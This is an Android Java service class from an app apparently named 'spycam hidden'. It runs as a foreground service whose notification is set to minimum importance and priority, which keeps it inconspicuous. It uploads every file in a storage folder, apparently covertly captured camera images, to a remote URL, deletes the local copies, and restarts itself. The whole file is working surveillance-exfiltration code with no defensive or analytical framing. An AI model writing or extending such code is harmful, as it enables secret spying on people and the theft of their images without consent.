package com.spycam.hidden.spycamhidden;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.util.Objects;

import static androidx.core.app.NotificationCompat.PRIORITY_MIN;

public class UploadFileService extends Service {

    private void startServiceOreoCondition() {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
            /*    Intent notificationIntent = new Intent(getApplicationContext(), NotificationAlertActivity.class);
                notificationIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP
                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);

                PendingIntent intent = PendingIntent.getActivity(getApplicationContext(), 0,
                        notificationIntent, 0);
*/
                String CHANNEL_ID = "ch_01";
                String CHANNEL_NAME = "intent_service";

                NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
                        CHANNEL_NAME, NotificationManager.IMPORTANCE_NONE);
                ((NotificationManager) Objects.requireNonNull(getSystemService(Context.NOTIFICATION_SERVICE))).createNotificationChannel(channel);

                Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                        .setCategory(Notification.CATEGORY_SERVICE).setPriority(PRIORITY_MIN).build();


                startForeground(101, notification);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        startServiceOreoCondition();
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

        StrictMode.setThreadPolicy(policy);

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        try {
            Bundle extras = intent.getExtras();

//you can pass using intent,that which camera you want to use front/rear
            assert extras != null;
            String uid = extras.getString("uid");
            String url = extras.getString("url");
            String macAddress = extras.getString("spyfolder");

            File imagesFolder = new File(
                    Environment.getExternalStorageDirectory(), "foldername");
            File[] files = imagesFolder.listFiles();
            Log.d("Test", "Size: " + Objects.requireNonNull(files).length);
            for (File file : files) {
                Log.d("Test", "FileName:" + file.getName());
                Log.d("Test", "FileName:" + file.getAbsolutePath());

                UploadData u = new UploadData();
                String msg = u.uploadData(file.getAbsolutePath(), uid, url, macAddress);

                Log.d("Test", "onHandleIntent: " + msg);
                file.delete();
                stopService(new Intent(getApplicationContext(), UploadFileService.class));

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return START_STICKY;
    }


}
